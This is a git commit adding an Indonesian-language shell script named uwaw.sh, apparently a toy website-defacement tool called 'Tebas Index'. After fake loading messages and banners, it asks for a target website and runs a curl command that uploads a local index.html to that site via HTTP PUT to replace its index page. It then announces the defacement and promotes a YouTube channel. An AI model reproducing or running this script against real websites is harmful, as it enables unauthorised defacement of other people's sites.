a12d3d5ecec9c045d2bf0e15157a0ae265233170
MrChaptcha <54666428+MrChaptcha@users.noreply.github.com>
2019-08-29 17:22:19 +0700

    Create uwaw.sh

---
+++ uwaw.sh
@@ -0,0 +1,52 @@
+
+#1/bin/sh
+clear
+green='\e[1;32m'
+blue='\e[1;34m'
+red='\e[1;31m'
+
+echo "Hi Lont3 Perkenal Kan Dulu Diri Anda"
+
+echo "ok?"
+echo  "loading"
+sleep 2
+echo "loading..."
+sleep 2
+echo 'loading...........'
+sleep 2
+echo "loading.."
+sleep 2
+echo "loading....."
+
+
+
+
+
+read -p "Masukan Nama loe cukk:" nama
+echo "selamat Datang" $nama
+read -p "Oh Iya Nama Pacar lu Siapa? hehe Kalo Jomblo Isinya Asal-Asalan Aja:" nama
+
+sleep 2
+echo "#########################
+##                     ##
+##  pembuat:MR CHAPTCHA##
+##     *TEBAS INDEX*   ##
+#########################"
+
+figlet "Tebas Index"
+figlet "Captcha"
+
+read -p "Masukin Target Website Anda:=>" Website
+clear
+sleep 1
+echo "sedang Memuat"
+sleep 1
+echo "tunggu Lagi Dalam Proses Tebass"
+sleep 1
+curl -T /sdcard/index.html $Website
+sleep 2
+
+echo "Widih Mantap Coy Tertebass Website Nya :) ==>>" $Website
+
+figlet "Terimakasih"
+echo "         MAKASIH YA BRAYy UDAH PAKE SC INI SUBSCRIBE CHANNEL SAYA  https://www.youtube.com/channel/UCAyakRAU8CAsDQyAYpyX56g"
